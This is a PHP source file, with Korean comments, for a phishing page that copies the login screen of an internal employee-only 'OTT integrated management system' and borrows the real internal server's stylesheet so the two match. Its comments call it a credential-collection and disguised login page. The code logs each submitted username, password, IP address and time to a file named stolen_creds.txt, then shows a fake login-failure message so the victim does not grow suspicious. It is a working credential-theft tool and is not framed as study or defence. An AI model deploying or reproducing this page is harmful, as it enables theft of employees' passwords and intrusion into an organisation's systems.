<?php
// 계정 정보 수집 및 위장 로그인 페이지

$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['username'] ?? '');
    $password = (string)($_POST['password'] ?? '');

    if ($username === '' || $password === '') {
        $error = '아이디와 비밀번호를 모두 입력해주세요.';
    } else {
        // [핵심] 탈취한 계정 정보를 서버 내부에 기록
        $log_data = sprintf(
            "[%s] IP: %s | Username: %s | Password: %s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $username,
            $password
        );
        file_put_contents(__DIR__ . '/stolen_creds.txt', $log_data, FILE_APPEND | LOCK_EX);

        // 의심을 피하기 위한 로그인 실패 메시지 출력
        $error = '아이디 또는 비밀번호가 올바르지 않습니다.';
    }
}
?>
<!DOCTYPE html>
<html lang="ko">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>로그인 - OTT 통합 관리 시스템</title>
<!-- 사내 원본 서버의 CSS를 직접 참조하여 디자인 일치화 -->
<link rel="stylesheet" href="https://192.168.20.10/css/style.css">
</head>
<body class="login-page">
    <div class="login-box">
        <h1>OTT 통합 관리 시스템</h1>
        <p class="sub">사내 구성원만 이용할 수 있습니다.</p>

        <?php if ($error): ?>
            <p style="color:var(--danger); font-size:13px; margin-bottom:16px;"><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <!-- 자기 자신으로 POST 요청을 보내어 정보 탈취 후 에러 출력 -->
        <form method="post" action="login.php">
            <div class="form-group">
                <label for="username">아이디</label>
                <input type="text" id="username" name="username" autocomplete="username" required autofocus>
            </div>
            <div class="form-group">
                <label for="password">비밀번호</label>
                <input type="password" id="password" name="password" autocomplete="current-password" required>
            </div>
            <button type="submit" class="btn btn-primary">로그인</button>
        </form>
    </div>
</body>
</html>